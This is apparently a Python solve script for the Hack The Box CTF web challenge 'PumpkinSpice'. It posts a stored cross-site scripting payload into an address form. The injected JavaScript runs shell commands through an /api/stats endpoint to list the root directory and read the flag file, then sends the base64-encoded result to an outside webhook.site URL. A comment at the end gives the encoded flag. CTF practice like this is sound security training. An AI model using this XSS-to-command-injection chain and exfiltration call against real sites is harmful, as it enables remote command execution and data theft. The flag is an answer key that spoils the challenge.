#https://github.com/hackthebox/htboo-ctf-2023/tree/main/htboo-ctf-2023/web/%5BEasy%5D%20PumpkinSpice
#!/usr/bin/env python3

import requests

HOST, PORT = "94.237.56.76", 34783
CHALLENGE_URL = f"http://{HOST}:{PORT}"
WEBHOOK_URL = "https://webhook.site/0e14b513-4701-4ca2-8620-44d1f1801048"

#Notice that f"'{WEBHOOK_URL}'" won't work...

def main():
    form_data = {
        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('https://webhook.site/0e14b513-4701-4ca2-8620-44d1f1801048?c=' + btoa(flag))}})()</script>"
    }

    requests.post(f"{CHALLENGE_URL}/add/address", data=form_data)


if __name__ == "__main__":
    main()


'''
Or directly input the <script> into webpage.

SFRCe3RoM190cjM0dF9tMXM1aTBufQo=
'''
